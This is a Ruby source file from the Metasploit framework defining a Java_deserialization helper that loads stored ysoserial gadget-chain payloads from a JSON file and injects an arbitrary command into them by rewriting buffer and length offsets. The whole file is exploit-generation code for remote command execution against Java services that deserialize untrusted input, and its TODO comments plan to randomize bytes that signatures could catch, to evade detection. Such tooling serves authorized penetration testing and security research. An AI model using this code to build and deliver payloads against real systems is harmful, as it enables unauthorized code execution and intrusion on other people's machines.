module Msf
module Util

require 'json'
require 'base64'

PAYLOAD_FILENAME="ysoserial_payloads.json"

#TODO: Randomize bytes which could be signatured (ysoserial/Pwner000000000000000)
#TODO: Support ysoserial alongside ysoserial-modified payloads (including cmd, bash, powershell, none)

class Java_deserialization

  def self.ysoserial_payload(payloadName, command=nil)
    # Open the JSON file and parse it
    begin
      path = File.join(Msf::Config.data_directory, PAYLOAD_FILENAME)
      json = JSON.parse(File.read(path))
    rescue Errno::ENOENT
      raise RuntimeError, "Unable to load JSON data from 'data/#{PAYLOAD_FILENAME}'"
    end

    raise ArgumentError, "#{payloadName} payload not found in ysoserial payloads" if json[payloadName].nil?

    # Extract the specified payload (status, lengthOffset, bufferOffset, bytes)
    payload = json[payloadName]

    # Based on the status, we'll raise an exception, return a static payload, or
    #   generate a dynamic payload with modifications at the specified offsets
    case payload['status']
    when "unsupported"
      # This exception will occur most commonly with complex payloads that require more than a string
      raise ArgumentError, "ysoserial payload is unsupported"
    when "static"
      #TODO: Consider removing 'static' functionality, since ysoserial doesn't currently use it
      return Base64.decode64(payload['bytes'])
    when "dynamic"
      raise ArgumentError, "missing command parameter" if command.nil?

      bytes = Base64.decode64(payload['bytes'])

      # Insert buffer
      bufferOffset  = payload['bufferOffset'].first   #TODO: Do we ever need to support multiple buffers?
      bytes[bufferOffset-1] += command

      # Overwrite lengthOffset (multiple times, if necessary)
      lengthOffsets = payload['lengthOffset']
      lengthOffsets.each do |lengthOffset|
        #TODO: Handle command strings >255 chars
        raise RuntimeError, "Command buffer too large" if bytes[lengthOffset].ord + command.length > 255
        bytes[lengthOffset] = (bytes[lengthOffset].ord + command.length.ord).chr
      end

      # TODO: Randomize "ysoserial/Pwner00000000000000"
      return bytes
    else 
      raise RuntimeError, "Malformed JSON file"
    end
  end
end
end
end

